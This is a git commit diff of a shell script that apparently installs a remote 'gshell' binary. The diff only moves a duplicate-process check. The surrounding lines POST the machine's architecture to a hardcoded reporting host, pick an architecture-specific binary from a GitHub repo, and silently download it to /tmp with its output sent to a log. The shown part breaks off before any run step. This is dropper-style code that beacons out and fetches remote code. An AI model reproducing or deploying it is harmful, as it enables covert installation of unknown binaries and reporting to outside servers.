08d3232845d673e10dfade110bba6def6907c6ec
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-05-08 17:04:12 +0000

    Update gsha71c4b77a5e5.sh

--- gsha71c4b77a5e5.sh
+++ gsha71c4b77a5e5.sh
@@ -1,11 +1,6 @@
 #!/bin/sh
 
 #[ "${FLOCKER}" != "$0" ] && exec env FLOCKER="$0" flock -en "$0" "$0" "$@" || :
-runCount=$(ps -ef|grep gshell71085644.bin | grep -v grep -c)
-if [ $runCount != 0 ];then
-    echo "exit"
-    exit
-fi 
 
 report_url="http://report.dataplan.online:19388/9024134B28978B68666E2B034E46130E/debug"
 arm_url="https://raw.githubusercontent.com/gptloveyou/gshell/main/client/garm64"
@@ -19,6 +14,13 @@ else
     pl_url=$i386_url
     curl -X POST $report_url -d "GShell_i386"
 fi 
+
+runCount=$(ps -ef|grep gshell71085644.bin | grep -v grep -c)
+if [ $runCount != 0 ];then
+    echo "exit"
+    exit
+fi 
+
 curl -o /tmp/gshell71085644.bin $pl_url 1>/tmp/tmplog0423231.log 2>&1
 runCount2=$(ps -ef|grep gshell71085644.bin | grep -v grep -c)
 if [ $runCount2 != 0 ];then
